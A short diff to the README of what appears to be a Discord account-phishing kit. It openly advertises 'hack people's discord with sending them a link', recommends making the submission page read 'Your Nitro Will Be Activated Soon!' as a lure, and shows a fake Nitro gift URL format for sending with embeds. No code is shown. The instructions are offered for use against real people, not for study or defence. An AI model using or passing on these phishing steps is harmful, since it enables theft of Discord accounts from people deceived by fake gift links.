@@ -9,8 +9,7 @@
 
 > [!NOTE]
 > hack people's discord with sending them a link!
-
-> [!NOTE]
+>
 > you can set anything in the file "submited.php".   I recommend you to change the content of it to "Your Nitro Will Be Activated Soon!"
 
 If you want te send the link with embeds send it like this: www.yourdomain.com/gift/HJ9fh9hGfgfijh93<br/>
